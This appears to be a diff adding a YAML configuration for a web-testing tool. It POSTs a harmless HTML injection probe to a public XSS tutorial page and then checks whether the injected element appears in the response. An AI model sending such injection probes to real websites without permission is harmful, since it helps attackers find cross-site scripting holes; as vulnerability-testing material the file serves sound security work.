@@ -1,0 +1,22 @@
+---
+name: exploit
+description: This request sends a POST payload to exploit a XSS vulnerability
+module: http
+parameter:
+    url: http://www.steve.org.uk/Security/XSS/Tutorial/simple.cgi
+    method: POST
+    headers:
+        user-agent: Mozilla/5.0
+        content-type: application/x-www-form-urlencoded
+    body:
+        text: <div id=explo>explo</div>
+    extract:
+        explo: "#explo"
+---
+name: result
+description: Check if payload was injected successfull
+module: report
+source: exploit.extracted.explo
+parameter:
+    type: stringcompare
+    value: explo
